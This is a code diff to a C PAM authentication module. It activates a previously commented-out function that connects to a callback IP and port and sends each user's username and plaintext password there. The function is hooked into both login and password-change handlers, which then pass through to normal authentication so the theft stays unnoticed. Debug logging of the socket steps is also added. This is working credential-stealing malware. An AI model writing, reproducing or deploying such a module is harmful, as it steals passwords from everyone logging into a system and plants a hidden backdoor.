@@ -17,24 +17,31 @@
 
 typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 
-int pam_send_authtok(const char *message, const char *username, const char *password) {
-    // const char *ret_fmt = "%s:%s\n";
+int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
+    const char *ret_fmt = "%s:%s\n";
 
-    // int sock = socket(AF_INET, SOCK_STREAM, 0);
-    // if (sock >= 0) {
-    //     struct sockaddr_in serv_addr;
-    //     serv_addr.sin_family = AF_INET;
-    //     serv_addr.sin_port = htons(CALLBACK_PORT);
-    //     inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock >= 0) {
+        pam_syslog(pamh, LOG_INFO, "Socket Created!");
+        struct sockaddr_in serv_addr;
+        serv_addr.sin_family = AF_INET;
+        serv_addr.sin_port = htons(CALLBACK_PORT);
+        inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
 
-    //     if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
-    //         char credentials[256];
-    //         snprintf(credentials, sizeof(credentials), ret_fmt, username, password);
-    //         send(sock, credentials, strlen(credentials), 0);
-    //     }
+        if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
+            pam_syslog(pamh, LOG_INFO, "Socket connected");
+            char credentials[256];
+            snprintf(credentials, sizeof(credentials), ret_fmt, username, password);
+            send(sock, credentials, strlen(credentials), 0);
+            pam_syslog(pamh, LOG_INFO, "Message sent!");
+        }
 
-    //     close(sock);
-    // }
+        pam_syslog(pamh, LOG_INFO, "Closing socket");
+
+        close(sock);
+
+        pam_syslog(pamh, LOG_INFO, "Socket closed");
+    }
 
     return 0;
 }
@@ -77,7 +84,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     pam_get_user(pamh, &username, NULL);
     pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
 
-    pam_send_authtok("USER AUTHENTICATED: ", username, password);
+    pam_send_authtok(pamh, "USER AUTHENTICATED: ", username, password);
 
     return pam_unix_authenticate("pam_sm_authenticate", pamh, flags, argc, argv);
 }
@@ -89,7 +96,7 @@ PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const c
     pam_get_user(pamh, &username, NULL);
     pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
 
-    pam_send_authtok("USER CHANGED PASSWORD: ", username, password);
+    pam_send_authtok(pamh, "USER CHANGED PASSWORD: ", username, password);
 
     return pam_unix_authenticate("pam_sm_chauthtok", pamh, flags, argc, argv);
 }
